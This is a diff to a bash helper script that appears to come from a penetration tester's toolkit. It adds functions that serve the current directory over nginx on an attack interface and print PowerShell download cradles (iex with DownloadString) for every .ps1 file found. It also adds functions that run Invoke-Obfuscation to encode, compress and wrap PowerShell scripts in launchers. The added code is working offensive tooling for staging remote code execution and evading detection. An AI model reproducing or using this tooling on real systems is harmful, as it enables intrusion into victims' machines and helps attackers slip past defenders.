@@ -198,16 +198,18 @@ function nginxsslcert() {
 }
 
 
-echo "nginxhere - spawns nginx http server in current dir - nginxhere <HTTP-PORT> <HTTPS-PORT>"
+echo "nginxhere - spawns nginx http server in current dir - nginxhere <HTTP-PORT> <HTTPS-PORT> <IFACE>"
 function nginxhere() {
 
 
         PORT_HTTP=$1
         PORT_HTTPS=$2
+        ATTACK_INTERFACE=$3
+        IPV4="$(ip -a -o -4 addr list $ATTACK_INTERFACE | awk '{print $4}' | cut -d/ -f1)"
         NGINX_CONTAINER_NAME='nginx'
         RED='\033[0;31m'
         NC='\033[0m' # No Color
-        if [ $# -eq 2 ];then
+        if [ $# -eq 3 ];then
                 FILE="/opt/ssl/server.crt"
                 if test -f "$FILE"; then
                     echo "$FILE Certificate exists ... continuing ..."
@@ -219,17 +221,38 @@ function nginxhere() {
                 fi
                 
                 echo "You can access the nginxwebserver via the following url: "
-                echo "http://0.0.0.0:$PORT_HTTP"
-                echo "https://0.0.0.0:$PORT_HTTPS\n"
+                echo "http://$IPV4:$PORT_HTTP"
+                echo "https://$IPV4:$PORT_HTTPS\n"
                 echo "be aware that you can always attach to the container to observe the logs:"
                 echo "docker attach $NGINX_CONTAINER_NAME\n"
                 echo "If you wish to stop the container run:"
                 echo "nginxstop\n"
                 echo "If you wish to stop the container run: "
                 echo "nginxpurge\n"
+                echo "Generating a file with PowerShell Download cradles"
+                iexurls $IPV4 $PORT_HTTP | tee iex-commands.txt
+
 
         else
-                echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443${NC}"
+                echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443 tun0${NC}"
+        fi
+}
+
+
+echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>"
+function iexurls(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+
+        if [ $# -eq 2 ];then
+                IP=$1
+                PORT=$2
+                find . -name "*.ps1" | while read SCRIPT_PATH 
+                        do
+                                echo "iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
+                        done
+        else
+                echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
         fi
 }
 
@@ -544,6 +567,36 @@ function psobfuscatecmd(){
                 echo -e "${RED}psobfuscatecmd${NC}"
         fi
 }
+
+echo "psobfuscatescript - obfuscating a script - psobfuscatescript <SCRIPT_PATH.ps1>"
+function psobfuscatescript(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 1 ];then
+                SCRIPT_PATH=$1
+                echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
+                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"  | tee $SCRIPT_PATH.obfs.txt
+        else
+                echo -e "${RED}psobfuscatescript <SCRIPT.ps1>${NC}"
+        fi
+}
+
+echo "psobfuscaterecursively - obfuscating all ps1 script within a path - psobfuscaterecursively <PATH>"
+function psobfuscaterecursively(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 1 ];then
+                find . | grep ".ps1" --color=never | grep Tools --color=never | sort | while read SCRIPT_PATH 
+                do
+                        echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
+                        pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet" | tee $SCRIPT_PATH.obfs.txt
+                done
+        else
+                echo -e "${RED}psobfuscaterecursively${NC}"
+        fi
+}
+
+
 
 echo -e "${YELLOW}${BOLD}\n==============================${NC}"
 echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
